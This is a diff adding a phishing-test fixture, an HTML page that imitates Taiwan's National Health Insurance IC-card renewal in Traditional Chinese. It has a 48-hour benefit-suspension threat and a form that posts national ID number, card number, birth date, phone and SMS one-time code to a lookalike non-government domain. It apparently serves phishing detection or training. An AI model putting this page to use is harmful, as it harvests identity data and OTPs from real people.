@@ -1,0 +1,45 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake 健保署 (NHI) health-card renewal.
+  165 category: 假冒衛福部健保署 / 健保卡 IC 認證. Plays on the genuine
+  NHI card renewal procedure. The real flow lives at nhi.gov.tw and never
+  collects credit cards. This kit's host is NOT on .gov.tw.
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>衛生福利部中央健康保險署 - 健保 IC 卡認證</title>
+    <style>
+      body { font-family: "Microsoft JhengHei", sans-serif;
+             background: #e8f0f7; margin: 0; }
+      .gov-bar { background: #0066b3; color: white; padding: 6px 16px;
+                 font-size: 12px; }
+      .container { max-width: 460px; margin: 24px auto;
+                   background: white; padding: 22px; border: 1px solid #b8c8d8;
+                   border-radius: 6px; }
+      h1 { color: #00457c; font-size: 19px; }
+      .notice { background: #ffe8e8; color: #a40000; padding: 10px;
+                font-size: 13px; border-left: 4px solid #c00; margin: 12px 0; }
+      label { font-size: 13px; color: #333; display: block; margin-top: 12px; }
+      input { width: 100%; padding: 7px; border: 1px solid #aaa;
+              box-sizing: border-box; }
+      button { padding: 10px 20px; background: #00457c; color: white;
+               border: 0; margin-top: 16px; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <div class="gov-bar">中華民國衛生福利部 中央健康保險署</div>
+    <div class="container">
+      <h1>健保 IC 卡電子認證</h1>
+      <p class="notice">您的健保 IC 卡認證即將過期，請於 48 小時內完成線上更新，逾期將暫停醫療給付資格。</p>
+      <form action="https://nhi-care-verify.healthcare-tw.click/submit" method="post">
+        <label>身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>健保卡卡號 (12 碼) <input name="card_number" placeholder="000000000000" required></label>
+        <label>出生年月日 <input name="dob" placeholder="民國 YYYMMDD" required></label>
+        <label>聯絡電話 <input name="phone" required></label>
+        <label>簡訊驗證碼 <input name="otp" inputmode="numeric" autocomplete="one-time-code" required></label>
+        <button>送出認證</button>
+      </form>
+    </div>
+  </body>
+</html>
